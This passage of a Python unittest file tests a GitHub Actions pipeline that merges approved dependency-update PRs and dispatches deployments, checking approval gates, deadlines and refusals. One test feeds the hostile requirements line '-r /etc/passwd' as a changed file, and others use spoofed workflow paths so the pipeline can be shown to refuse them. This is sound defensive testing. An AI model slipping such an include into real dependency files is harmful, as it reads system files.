            return {'jobs': [{'name': name, 'head_sha': SHA, 'conclusion': 'success'} for name in policy.CHECKS], 'total_count': 4}
        if '/actions/workflows/deploy.yml/runs' in path:
            dispatches = [m for m in self.mutations if m[1] == '/actions/workflows/deploy.yml/dispatches']
            return {'workflow_runs': [{'id': 16, 'event': 'workflow_dispatch', 'head_sha': self.merged, 'path': '.github/workflows/deploy.yml', 'status': 'completed', 'conclusion': 'success'}] if dispatches else [], 'total_count': int(bool(dispatches))}
        raise AssertionError('Unexpected controlled API request: ' + endpoint)

    def plan(self):
        value = pipeline.candidate(self.api, 1, SHA, BASE, BASE)
        value['ci_run'] = 15
        return value

    def execute(self, plan):
        with tempfile.TemporaryDirectory() as directory:
            with patch.dict(os.environ, {'GITHUB_RUN_ATTEMPT': '1', 'GITHUB_SHA': BASE, 'GITHUB_RUN_ID': '10', 'GITHUB_STEP_SUMMARY': directory + '/summary'}):
                pipeline.execute(self.api, plan, policy.plan_hash(plan))

    def test_approved_candidate_merges_once_then_explicitly_deploys_exact_merge(self):
        self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])
        self.assertEqual(self.mutations[0][2]['sha'], SHA)
        self.assertEqual(self.mutations[1][2]['inputs']['expected_commit'], self.merged)
        self.assertEqual(self.mutations[1][2]['inputs']['approval_run'], '10')

    def delayed_deployments(self, clock, ready_after, conclusion='success'):
        transport = self.transport

        def controlled(method, path, body):
            workflows = ('deploy.yml', 'deploy-audio-concat.yml')
            for index, workflow in enumerate(workflows):
                if '/actions/workflows/' + workflow + '/runs' in path:
                    dispatched = any(m[1] == '/actions/workflows/' + workflow + '/dispatches' for m in self.mutations)
                    completed = clock.elapsed >= ready_after.get(workflow, float('inf'))
                    run = {'id': 16 + index, 'event': 'workflow_dispatch', 'head_sha': self.merged,
                           'path': '.github/workflows/' + workflow,
                           'status': 'completed' if completed else 'in_progress',
                           'conclusion': conclusion if completed else None}
                    # A successful foreign head must never satisfy this wait.
                    foreign = dict(run, id=99, head_sha='d' * 40, status='completed', conclusion='success')
                    return {'workflow_runs': [foreign, run] if dispatched else [], 'total_count': 2 if dispatched else 0}
            return transport(method, path, body)

        self.api = github.GitHub(self.repo, transport=controlled)

    def test_application_and_audio_can_each_succeed_after_thirty_minutes(self):
        self.paths.append('infra/audio-concat/requirements.in')
        clock = FakeClock()
        self.delayed_deployments(clock, {'deploy.yml': 31 * 60, 'deploy-audio-concat.yml': 62 * 60})
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            self.execute(self.plan())
        self.assertEqual(clock.elapsed, 62 * 60)
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST', 'POST'])
        for mutation in self.mutations[1:]:
            self.assertEqual(mutation[2]['ref'], 'main')
            self.assertEqual(mutation[2]['inputs'], {'expected_commit': self.merged, 'approval_run': '10', 'approved_pr': '1', 'approved_head': SHA, 'approved_base': BASE})

    def test_deployment_deadline_expires_once_without_merge_or_dispatch_replay(self):
        self.paths.append('infra/audio-concat/requirements.in')
        clock = FakeClock()
        self.delayed_deployments(clock, {})
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                self.execute(self.plan())
        self.assertEqual(clock.elapsed, 145 * 60)
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])
        self.assertEqual(self.mutations[1][1], '/actions/workflows/deploy.yml/dispatches')

    def test_audio_deadline_expires_once_after_application_success(self):
        self.paths.append('infra/audio-concat/requirements.in')
        clock = FakeClock()
        self.delayed_deployments(clock, {'deploy.yml': 0})
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                self.execute(self.plan())
        self.assertEqual(clock.elapsed, 50 * 60)
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST', 'POST'])
        self.assertEqual(self.mutations[-1][1], '/actions/workflows/deploy-audio-concat.yml/dispatches')

    def test_failed_deployment_after_thirty_minutes_stops_without_audio_or_replay(self):
        self.paths.append('infra/audio-concat/requirements.in')
        clock = FakeClock()
        self.delayed_deployments(clock, {'deploy.yml': 31 * 60}, conclusion='failure')
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Dispatched workflow failed'):
                self.execute(self.plan())
        self.assertEqual(clock.elapsed, 31 * 60)
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])

    def test_wrong_deployment_path_stops_after_single_merge_and_dispatch(self):
        transport = self.transport

        def controlled(method, path, body):
            result = transport(method, path, body)
            if '/actions/workflows/deploy.yml/runs' in path:
                for run in result['workflow_runs']:
                    run['path'] = '.github/workflows/spoof.yml'
            return result

        self.api = github.GitHub(self.repo, transport=controlled)
        with self.assertRaisesRegex(policy.Refused, 'Unexpected deployment workflow'):
            self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])

    def test_nonrequired_preview_failure_does_not_block_verified_dependency_merge(self):
        # GitHub reports unstable when optional preview checks fail; the four
        # exact-head dependency jobs still succeed and PUT uses normal rules.
        self.mergeable_state = 'unstable'
        self.preview_failure = True
        self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])
        self.assertEqual(self.mutations[0][2], {'sha': SHA, 'merge_method': 'merge', 'commit_title': 'Approved dependency update PR #1'})

    def test_unstable_pr_with_failed_fixed_ci_still_cannot_merge(self):
        self.mergeable_state = 'unstable'
        plan = self.plan()
        transport = self.transport

        def controlled(method, path, body):
            result = transport(method, path, body)
            if path.split('?')[0].endswith('/jobs'):
                result['jobs'][0]['conclusion'] = 'failure'
            return result

        self.api = github.GitHub(self.repo, transport=controlled)
        with self.assertRaisesRegex(policy.Refused, 'four exact-head CI jobs'):
            self.execute(plan)
        self.assertEqual(self.mutations, [])

    def test_native_merge_rejection_of_unstable_pr_cannot_start_deployment(self):
        self.mergeable_state = 'unstable'
        transport = self.transport

        def controlled(method, path, body):
            if method == 'PUT':
                self.mutations.append((method, path, body))
                return {'merged': False}
            return transport(method, path, body)

        self.api = github.GitHub(self.repo, transport=controlled)
        with self.assertRaisesRegex(policy.Refused, 'Protected branch merge rejected'):
            self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT'])

    def test_blocked_behind_dirty_and_unknown_merge_states_cannot_attempt_merge(self):
        for state in ['blocked', 'behind', 'dirty', 'unknown', None, '']:
            with self.subTest(state=state):
                self.setUp()
                self.mergeable_state = state
                with self.assertRaisesRegex(policy.Refused, 'ready to merge'):
                    self.execute(self.plan())
                self.assertEqual(self.mutations, [])

    def test_large_python_hash_diff_has_bounded_summary_and_immutable_full_blob(self):
        import base64
        import hashlib
        import re
        original = (Path('/repository') / 'worker/requirements.txt').read_text()
        updated = re.sub(r'sha256:([0-9a-f]{64})', lambda match: 'sha256:' + hashlib.sha256(match[1].encode()).hexdigest(), original)
        self.paths = ['worker/requirements.txt']
        transport = self.transport
        def content_transport(method, path, body):
            if path.startswith('/contents/'):
                text = original if 'ref=' + BASE in path else updated
                return {'type': 'file', 'encoding': 'base64', 'size': len(text), 'content': base64.b64encode(text.encode()).decode()}
            return transport(method, path, body)
        self.api = github.GitHub(self.repo, transport=content_transport)
        plan = self.plan()
        self.assertLess(len(policy.canonical(plan)), 48_000)
        entry = plan['files'][0]
        self.assertLess(sum(map(len, entry['changes'])), 12_000)
        self.assertEqual(entry['after'], hashlib.sha256(updated.encode()).hexdigest())
        digest = policy.plan_hash(plan)
        updated = updated.replace('anyio==4.15.1', 'anyio==4.15.2')
        with self.assertRaises(policy.Refused):
            policy.assert_unchanged(plan, self.plan(), digest)

    def test_no_approval_or_stale_head_base_diff_or_wrong_check_never_merges(self):
        for changed in ['approval', 'head', 'base', 'diff', 'check']:
            with self.subTest(changed=changed):
                self.setUp()
                plan = self.plan()
                if changed == 'approval': self.approvals = []
                if changed == 'head': self.head = 'd' * 40
                if changed == 'base': self.base = 'd' * 40
                if changed == 'diff': self.after = 'httpx==0.30.0\n'
                if changed == 'check': self.check_path = '.github/workflows/spoof.yml'
                with self.assertRaises(policy.Refused): self.execute(plan)
                self.assertEqual(self.mutations, [])

    def test_forks_authors_native_sources_and_missing_metadata_are_refused(self):
        for changed in ['fork', 'author', 'scope', 'script']:
            with self.subTest(changed=changed):
                self.setUp()
                if changed == 'fork': self.fork = True
                if changed == 'author': self.author = 'external-user'
                if changed == 'scope': self.paths = ['api/main.go']
                if changed == 'script': self.after = '-r /etc/passwd\n'
                with self.assertRaises(policy.Refused): self.plan()
                self.assertEqual(self.mutations, [])

    def test_dependency_branch_namespace_requires_its_exact_author(self):
        cases = [
            ('renovate-ci/pip-minor-patch', 'github-actions[bot]', False, True),
            ('dependency-security/fix-httpx', 'enjoydarts', True, True),
            ('renovate-ci/pip-minor-patch', 'enjoydarts', False, False),
            ('dependency-security/fix-httpx', 'github-actions[bot]', True, False),
        ]
        for branch, author, emergency, accepted in cases:
            with self.subTest(branch=branch, author=author):
                self.setUp()
                self.branch, self.author = branch, author
                self.labels = [{'name': 'dependency-security'}]
                self.body = 'Security fix: update the vulnerable httpx dependency.'
                if accepted:
                    self.assertEqual(self.plan()['emergency'], emergency)
                else:
                    with self.assertRaises(policy.Refused): self.plan()
                self.assertEqual(self.mutations, [])

    def test_identical_candidate_requests_are_deduplicated_across_run_history(self):
        plan = self.plan()
        title = pipeline.run_name(plan)
        api = github.GitHub(self.repo, transport=lambda *_: {'workflow_runs': [{'display_title': title}], 'total_count': 1})
        self.assertTrue(pipeline.deduplicated(api, plan))

    def test_ci_fixture_and_development_only_updates_do_not_deploy_live_services(self):
        plan = self.plan()
        # Candidate validation is real; the only substituted boundary is the
        # already tested immutable snapshot, with declared config-only targets.
        plan['surfaces'] = ['ci', 'development']
        with patch.object(pipeline, 'candidate', return_value={k: v for k, v in plan.items() if k != 'ci_run'}):
            self.execute(plan)
        self.assertEqual([m[0] for m in self.mutations], ['PUT'])

    def test_retry_attempt_cannot_reuse_native_approval(self):
        plan = self.plan()
        with patch.dict(os.environ, {'GITHUB_RUN_ATTEMPT': '2'}):
            with self.assertRaises(policy.Refused):
                pipeline.execute(self.api, plan, policy.plan_hash(plan))
        self.assertEqual(self.mutations, [])


class WorkflowWaitTests(unittest.TestCase):
    def test_ci_has_its_own_short_finite_deadline_without_redispatch(self):
        clock = FakeClock()
        mutations = []

        def transport(method, path, body):
            if method == 'POST':
                mutations.append((path, body))
            return {'workflow_runs': [], 'total_count': 0}

        api = github.GitHub('owner/repo', transport=transport)
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                pipeline.dispatch_once(api, 'dependency-check.yml', 'renovate-ci/pip', SHA, {'expected_head': SHA})
        self.assertEqual(clock.elapsed, 35 * 60)
        self.assertEqual(len(mutations), 1)

    def test_wait_deadline_includes_api_latency_and_does_not_reset_on_new_polls(self):
        clock = FakeClock()

        def transport(*args):
            clock.elapsed += 3
            return {'workflow_runs': [], 'total_count': 0}

        api = github.GitHub('owner/repo', transport=transport)
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                pipeline.await_run(api, 'deploy.yml', SHA, 0, timeout_seconds=20)
        self.assertEqual(clock.elapsed, 20)

    def test_success_response_after_wait_deadline_cannot_authorize_next_deployment(self):
        clock = FakeClock()
        mutations = []

        def transport(method, path, body):
            if method == 'POST':
                mutations.append((path, body))
                return None
            if not mutations:
                return {'workflow_runs': [], 'total_count': 0}
            clock.elapsed += 21
            run = {'id': 16, 'event': 'workflow_dispatch', 'head_sha': SHA,
                   'path': '.github/workflows/deploy.yml', 'status': 'completed', 'conclusion': 'success'}
            return {'workflow_runs': [run], 'total_count': 1}

        api = github.GitHub('owner/repo', transport=transport)
        with patch.dict(pipeline.RUN_WAIT_SECONDS, {'deploy.yml': 20}), patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                pipeline.dispatch_once(api, 'deploy.yml', 'main', SHA, {'expected_commit': SHA})
        self.assertEqual(clock.elapsed, 21)
        self.assertEqual(mutations, [('/actions/workflows/deploy.yml/dispatches', {'ref': 'main', 'inputs': {'expected_commit': SHA}})])


class DeploymentAuthorizationTests(unittest.TestCase):
    def setUp(self):
        from dependency_updates import deploy
        self.deploy = deploy
        self.fixture = PipelineTests()
        self.fixture.setUp()
        self.fixture.base = self.fixture.merged
        self.override = ''
        self.api = github.GitHub(self.fixture.repo, transport=self.transport)
        self.environment = {'EXPECTED_COMMIT': self.fixture.merged, 'GITHUB_SHA': self.fixture.merged, 'GITHUB_REF': 'refs/heads/main', 'GITHUB_EVENT_NAME': 'workflow_dispatch', 'GITHUB_RUN_ID': '20', 'GITHUB_RUN_ATTEMPT': '1', 'GITHUB_WORKFLOW_REF': self.fixture.repo + '/.github/workflows/deploy.yml@refs/heads/main', 'APPROVAL_RUN': '10', 'APPROVED_PR': '1', 'APPROVED_HEAD': SHA, 'APPROVED_BASE': BASE}

    def transport(self, method, path, body):
        if '/actions/workflows/deploy.yml/runs' in path:
            rows = [{'id': 20, 'display_title': 'Approved dependency deployment 10 ' + self.fixture.merged}]
            if self.override == 'duplicate': rows.append(dict(rows[0], id=21))
            return {'workflow_runs': rows, 'total_count': len(rows)}
        if path == '/git/commits/' + self.fixture.merged:
            return {'parents': [] if self.override == 'parents' else [{'sha': BASE}, {'sha': SHA}]}
        if path == '/pulls/1':
            value = self.fixture.transport(method, path, body)
            value.update(merged=True, merge_commit_sha=self.fixture.merged)
            return value
        if path == '/actions/runs/10' and self.override == 'source':
            return dict(self.fixture.transport(method, path, body), head_sha=SHA)
        return self.fixture.transport(method, path, body)

    def test_deploy_requires_actual_approved_source_and_exact_merged_parents(self):
        with patch.dict(os.environ, self.environment):
            self.assertEqual(self.deploy.authorize(self.api), self.fixture.merged)
        self.assertEqual(self.fixture.mutations, [])

    def test_chat_flags_stale_pr_and_reused_approval_cannot_authorize_deployment(self):
        for condition in ['approval', 'source', 'parents', 'duplicate', 'head', 'base', 'rerun', 'ref']:
            with self.subTest(condition=condition):
                self.setUp()
                if condition in {'source', 'parents', 'duplicate'}: self.override = condition
                if condition == 'approval': self.fixture.approvals = []
                if condition == 'head': self.fixture.head = 'd' * 40
                if condition == 'base': self.fixture.base = 'd' * 40
                if condition == 'rerun': self.environment['GITHUB_RUN_ATTEMPT'] = '2'
                if condition == 'ref': self.environment['GITHUB_REF'] = 'refs/heads/untrusted'
                with patch.dict(os.environ, self.environment):
                    with self.assertRaises(policy.Refused): self.deploy.authorize(self.api)
                self.assertEqual(self.fixture.mutations, [])


class ReproposalTests(unittest.TestCase):
    def setUp(self):
        self.plan = {'pr': 1, 'head': SHA, 'base': BASE, 'source': BASE}
        self.run = {'id': 10, 'display_title': pipeline.run_name(self.plan), 'status': 'completed', 'conclusion': 'failure', 'event': 'workflow_dispatch', 'head_sha': BASE, 'head_branch': 'main', 'path': '.github/workflows/dependency-update.yml', 'run_attempt': 1}
        self.approvals = []
        self.jobs = [
            {'id': 101, 'run_id': 10, 'head_sha': BASE, 'name': 'prepare', 'status': 'completed', 'conclusion': 'failure', 'steps': [{'name': 'Run candidate CI', 'status': 'completed', 'conclusion': 'failure'}], 'runner_id': 1, 'runner_name': 'hosted'},
            {'id': 102, 'run_id': 10, 'head_sha': BASE, 'name': 'approve-merge-deploy', 'status': 'completed', 'conclusion': 'skipped', 'steps': [], 'runner_id': 0, 'runner_name': ''},
        ]
        self.pages_override = None
        self.mutations = []
        self.reads = []
        self.api = github.GitHub('owner/repo', transport=self.transport)

    def transport(self, method, path, body):
        if method != 'GET':
            self.mutations.append((method, path, body))
            return None
        self.reads.append(path)
        endpoint = path.split('?')[0]
        if endpoint == '/actions/workflows/dependency-update.yml/runs':
            return {'workflow_runs': [dict(self.run)], 'total_count': 1}
        if endpoint == '/actions/runs/10': return dict(self.run)
        if endpoint == '/actions/runs/10/approvals': return self.approvals
        if endpoint == '/actions/runs/10/jobs':
            if self.pages_override is not None: return self.pages_override
            return {'jobs': self.jobs, 'total_count': len(self.jobs)}
        raise AssertionError('Unexpected controlled read: ' + path)

    def test_completed_unapproved_prepare_failure_allows_a_fresh_run(self):
        self.assertFalse(pipeline.deduplicated(self.api, self.plan))
        self.assertTrue(any('jobs?filter=all' in path for path in self.reads))
        self.assertIn('/actions/runs/10/approvals', self.reads)
        self.assertEqual(self.mutations, [])

    def test_actual_skipped_job_with_null_runner_name_allows_fresh_run(self):
        # GitHub run 37584435913 / skipped job 112674138148 returns null,
        # unlike an assigned runner or an absent field in incomplete metadata.
        self.jobs[1]['runner_name'] = None
        self.assertFalse(pipeline.deduplicated(self.api, self.plan))

    def test_daily_discovery_dispatches_a_fresh_run_after_unconsumed_prepare_failure(self):
        fixture = PipelineTests()
        fixture.setUp()
        original = self.transport
        def transport(method, path, body):
            if path.split('?')[0] == '/pulls':
                return [{'number': 1, 'head': {'sha': SHA}}]
            if path.startswith('/actions/'):
                return original(method, path, body)
            return fixture.transport(method, path, body)
        api = github.GitHub('owner/repo', transport=transport)
        pipeline.discover(api)
        self.assertEqual(self.mutations, [('POST', '/actions/workflows/dependency-update.yml/dispatches', {'ref': 'main', 'inputs': {'pr_number': '1', 'head_sha': SHA, 'base_sha': BASE, 'source_sha': BASE}})])

    def test_daily_discovery_respects_owner_denial_without_redispatch(self):
        fixture = PipelineTests()
        fixture.setUp()
        self.approvals = [{'state': 'rejected', 'user': {'login': 'enjoydarts'}, 'environments': [{'name': 'production-maintenance'}]}]
        original = self.transport
        def transport(method, path, body):
            if path.split('?')[0] == '/pulls':
                return [{'number': 1, 'head': {'sha': SHA}}]
            if path.startswith('/actions/'):
                return original(method, path, body)
            return fixture.transport(method, path, body)
        pipeline.discover(github.GitHub('owner/repo', transport=transport))
        self.assertEqual(self.mutations, [])

    def test_cancelled_prepare_before_gate_allows_a_fresh_run(self):
        self.run['conclusion'] = 'cancelled'
        self.jobs[0]['conclusion'] = 'cancelled'
        self.jobs[1].update(conclusion='cancelled', started_at=None)
        self.assertFalse(pipeline.deduplicated(self.api, self.plan))

    def test_active_consumed_denied_or_uncertain_history_suppresses_reproposal(self):
        conditions = ['active', 'success', 'run_attempt', 'source', 'missing_run_attempt', 'approved', 'denied', 'malformed_approvals', 'missing_jobs', 'unknown_jobs', 'foreign_job', 'missing_steps', 'missing_runner_name', 'started_merge', 'cancelled_after_start', 'prepare_success', 'prepare_unknown']
        for condition in conditions:
            with self.subTest(condition=condition):
                self.setUp()
                if condition == 'active': self.run['status'] = 'in_progress'
                if condition == 'success': self.run['conclusion'] = 'success'
                if condition == 'run_attempt': self.run['run_attempt'] = 2
                if condition == 'source': self.run['head_sha'] = SHA
                if condition == 'missing_run_attempt': del self.run['run_attempt']
                if condition in {'approved', 'denied'}:
                    self.approvals = [{'state': 'approved' if condition == 'approved' else 'rejected', 'user': {'login': 'enjoydarts'}, 'environments': [{'name': 'production-maintenance'}]}]
                if condition == 'malformed_approvals': self.approvals = {}
                if condition == 'missing_jobs': self.jobs = self.jobs[:1]
                if condition == 'unknown_jobs': self.jobs.append(dict(self.jobs[0], id=103, name='execute'))
                if condition == 'foreign_job': self.jobs[1]['head_sha'] = SHA
                if condition == 'missing_steps': del self.jobs[1]['steps']
                if condition == 'missing_runner_name': del self.jobs[1]['runner_name']
                if condition == 'started_merge': self.jobs[1].update(conclusion='failure', runner_id=2, runner_name='hosted', steps=[{'name': 'Merge and deploy', 'status': 'completed', 'conclusion': 'failure'}])
                if condition == 'cancelled_after_start': self.jobs[1].update(conclusion='cancelled', started_at='2026-10-12T00:00:00Z')
                if condition == 'prepare_success': self.jobs[0]['conclusion'] = 'success'
                if condition == 'prepare_unknown': self.jobs[0]['conclusion'] = None
                self.assertTrue(pipeline.deduplicated(self.api, self.plan))
                self.assertEqual(self.mutations, [])

    def test_incomplete_or_unbounded_job_pagination_never_allows_reproposal(self):
        for response in [{'jobs': self.jobs[:1], 'total_count': 2}, {'jobs': self.jobs}, {'jobs': [self.jobs[0]] * 100, 'total_count': 2001}]:
            with self.subTest(response_keys=list(response)):
                self.pages_override = response
                with self.assertRaises(policy.Refused):
                    pipeline.deduplicated(self.api, self.plan)
                self.assertEqual(self.mutations, [])

    def test_one_consumed_run_suppresses_even_after_an_unconsumed_failure(self):
        original = self.transport
        def transport(method, path, body):
            if '/actions/workflows/dependency-update.yml/runs' in path:
                return {'workflow_runs': [dict(self.run), dict(self.run, id=11, status='in_progress', conclusion=None)], 'total_count': 2}
            return original(method, path, body)
        self.api = github.GitHub('owner/repo', transport=transport)
        self.assertTrue(pipeline.deduplicated(self.api, self.plan))


class MergeabilityTests(unittest.TestCase):
    def test_merge_consumes_only_current_protected_mergeable_candidate(self):
        calls = []
        pr = {'state': 'open', 'merged': False, 'head': {'sha': SHA}, 'base': {'sha': BASE, 'ref': 'main'}, 'mergeable': True, 'mergeable_state': 'clean'}
        def transport(method, path, body):
            calls.append((method, path, body))
            if method == 'PUT': return {'merged': True, 'sha': 'c' * 40}
            if path == '/pulls/1': return dict(pr)
            return {'commit': {'sha': BASE}, 'protected': True}
        api = github.GitHub('owner/repo', transport=transport)
        self.assertEqual(pipeline.merge_once(api, {'pr': 1, 'head': SHA, 'base': BASE}), 'c' * 40)
        self.assertEqual([c[0] for c in calls], ['GET', 'GET', 'PUT'])
        self.assertEqual(calls[-1][2]['sha'], SHA)

    def test_stale_unprotected_conflicted_or_unknown_merge_state_never_puts(self):
        for condition in ['head', 'base', 'main', 'protected', 'mergeable', 'mergeable_state', 'blocked']:
            with self.subTest(condition=condition):
                calls = []
                pr = {'state': 'open', 'merged': False, 'head': {'sha': SHA}, 'base': {'sha': BASE, 'ref': 'main'}, 'mergeable': True, 'mergeable_state': 'clean'}
                branch = {'commit': {'sha': BASE}, 'protected': True}
                if condition == 'head': pr['head']['sha'] = 'd' * 40
                if condition == 'base': pr['base']['sha'] = 'd' * 40
                if condition == 'main': branch['commit']['sha'] = 'd' * 40
                if condition == 'protected': branch['protected'] = False
                if condition == 'mergeable': pr['mergeable'] = None
                if condition == 'mergeable_state': pr['mergeable_state'] = 'unknown'
                if condition == 'blocked': pr['mergeable_state'] = 'blocked'
                def transport(method, path, body):
                    calls.append(method)
                    return pr if path == '/pulls/1' else branch
                api = github.GitHub('owner/repo', transport=transport)
                with self.assertRaises(policy.Refused):
                    pipeline.merge_once(api, {'pr': 1, 'head': SHA, 'base': BASE})
                self.assertNotIn('PUT', calls)


if __name__ == '__main__':
    unittest.main()
